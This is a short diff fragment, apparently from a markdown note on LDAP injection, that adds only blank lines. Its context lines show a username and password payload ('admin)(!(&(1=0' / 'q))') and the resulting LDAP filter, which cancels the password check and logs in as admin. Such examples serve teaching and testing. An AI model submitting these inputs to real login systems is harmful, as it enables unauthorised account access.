@@ -16,3 +16,5 @@ user  = admin)(!(&(1=0
 pass  = q))
 query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
 ```
+
+
